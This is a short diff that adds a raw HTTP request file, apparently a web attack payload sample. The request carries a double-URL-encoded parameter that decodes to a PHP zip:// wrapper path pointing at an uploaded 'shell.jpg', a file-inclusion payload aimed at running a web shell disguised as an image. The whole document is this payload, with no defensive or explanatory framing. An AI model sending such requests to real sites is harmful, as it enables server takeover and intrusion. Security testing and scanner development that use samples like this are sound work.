@@ -1,0 +1,4 @@
+GET /a?input=u%253Dzip%253A%252F%252Fupload%252Fshell.jpg HTTP/1.1
+Host: demo.example.com
+Connection: close
+
